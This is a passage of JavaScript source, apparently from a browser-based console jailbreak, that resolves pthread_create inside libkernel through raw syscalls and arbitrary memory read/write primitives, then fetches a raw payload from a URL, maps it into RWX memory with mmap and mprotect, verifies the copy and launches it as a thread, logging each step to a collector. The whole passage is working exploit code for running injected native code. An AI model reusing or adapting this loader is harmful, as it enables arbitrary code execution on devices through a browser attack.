    const id = ids.dv.getUint32(i * 4, true);
    if (sc(S.dynlib_get_info, id, info.at).i32 !== 0) continue;
    let name = "";
    for (let j = 8; j < 0x100 && info.u8[j] !== 0; j++)
      name += String.fromCharCode(info.u8[j]);
    if (!/^libkernel(?:_web)?\.sprx$/i.test(name) ||
        !same(qAt(info, 0x108), c.libkernelBase)) continue;
    for (const symbol of ["pthread_create", "scePthreadCreate"]) {
      const out = alloc(8); wipe(out, 8);
      const rv = sc(S.dynlib_dlsym, id, cstr(symbol).at, out.at).i32;
      if (rv !== 0) continue;
      const fn = qAt(out, 0);
      const delta = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW +
        (fn.low - (c.libkernelBase.low >>> 0));
      if (fn.hi === (c.libkernelBase.hi >>> 0) && delta > 0 && delta < 0x400000) {
        say("[p] resolved " + symbol + " through libkernel handle " + id +
          " at +0x" + delta.toString(16));
        return fn;
      }
    }
  }
  return null;
}

async function loadPayload(url, vorab) {
  const c = host();
  let blob = vorab || null;
  if (blob === null) {
    blob = await fetchBytes(url, "p");
    if (blob === null) return false;
  }

  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
  if (blob[0] !== 0xe9) {
    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
    return false;
  }

  const size = (blob.length + 0x3fff) & ~0x3fff;
  const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap failed, errno " + c.errno()); return false;
  }
  
  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
  }
  codeAt(entry, 0).hex("c3");
  const probe = c.callAddr(entry, []);
  if (probe === undefined || probe === null) {
    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
  }
  say("[p] entry page executes in ring 3, loading payload");

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }
  
  say("[p] corrected debug.bin copied byte-for-byte and verified, starting thread");

  const fn = STATE.pthread;
  if (!fn) {
    say("[p] pthread_create could not be resolved exactly from libkernel -- not calling it");
    return false;
  }
  if (!await checkpoint("pthread-armed", "starting corrected debug.bin thread")) {
    say("[p] PC collector did not acknowledge payload start");
    return false;
  }

  const thr = alloc(8);
  thr.u8.fill(0);
  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
  const handle = qAt(thr, 0);
  const started = rc === 0 && (handle.hi >>> 0) > 0;
  await checkpoint("pthread-returned", "rc=" + rc + " handle=" + text(handle));
  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
      + (started ? " -- running" : " -- did NOT start"));
  return started;
}

/* End of file */
export async function runAfterglow(ctx, opts) {
  return attempt(ctx, opts);
}
